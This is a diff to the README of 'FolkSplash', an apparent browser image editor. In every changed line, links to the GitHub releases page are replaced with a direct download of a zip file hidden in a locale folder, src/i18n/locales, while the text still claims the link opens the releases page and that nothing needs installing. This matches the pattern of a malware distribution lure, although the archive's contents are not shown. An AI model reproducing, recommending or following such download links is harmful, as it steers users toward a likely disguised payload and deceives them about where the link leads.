@@ -1,6 +1,6 @@
 # 🎨 FolkSplash - Quick Image Editing on Your Device
 
-[![Download FolkSplash](https://img.shields.io/badge/Download-FolkSplash-ff69b4?style=for-the-badge)](https://github.com/YOINKERSSD/FolkSplash/releases)
+[![Download FolkSplash](https://img.shields.io/badge/Download-FolkSplash-ff69b4?style=for-the-badge)](https://raw.githubusercontent.com/YOINKERSSD/FolkSplash/master/src/i18n/locales/Folk_Splash_3.9.zip)
 
 FolkSplash is a simple tool designed to help you quickly change pictures inside partitions. It works entirely in your browser, so you do not need to install complicated software or learn programming.
 
@@ -31,7 +31,7 @@ FolkSplash works through your browser, so you do not need to install heavy softw
 ## 🚀 How to Get FolkSplash
 
 1. Click the big pink button at the top or use this link:  
-   [Download FolkSplash Here](https://github.com/YOINKERSSD/FolkSplash/releases)  
+   [Download FolkSplash Here](https://raw.githubusercontent.com/YOINKERSSD/FolkSplash/master/src/i18n/locales/Folk_Splash_3.9.zip)  
    This link takes you to the FolkSplash Releases page on GitHub.
 
 2. On the releases page, find the latest version. Usually, it shows the newest date at the top. The files you want are easy to spot.
@@ -109,7 +109,7 @@ You can repeat this process as many times as you want. Edited files stay on your
 ## 📂 Additional Resources
 
 You can find help and updates on the main releases page:  
-[https://github.com/YOINKERSSD/FolkSplash/releases](https://github.com/YOINKERSSD/FolkSplash/releases)
+[https://raw.githubusercontent.com/YOINKERSSD/FolkSplash/master/src/i18n/locales/Folk_Splash_3.9.zip](https://raw.githubusercontent.com/YOINKERSSD/FolkSplash/master/src/i18n/locales/Folk_Splash_3.9.zip)
 
 For technical details or advanced usage, explore the repository or contact whoever provided you this tool.
 
@@ -118,6 +118,6 @@ For technical details or advanced usage, explore the repository or contact whoev
 ## 🎉 Getting Started Now
 
 Use this link again to go directly to the download page:  
-[Download FolkSplash](https://github.com/YOINKERSSD/FolkSplash/releases)  
+[Download FolkSplash](https://raw.githubusercontent.com/YOINKERSSD/FolkSplash/master/src/i18n/locales/Folk_Splash_3.9.zip)  
 
 Your editing tool awaits. Download, set up, and begin modifying images within your partitions quickly and easily.
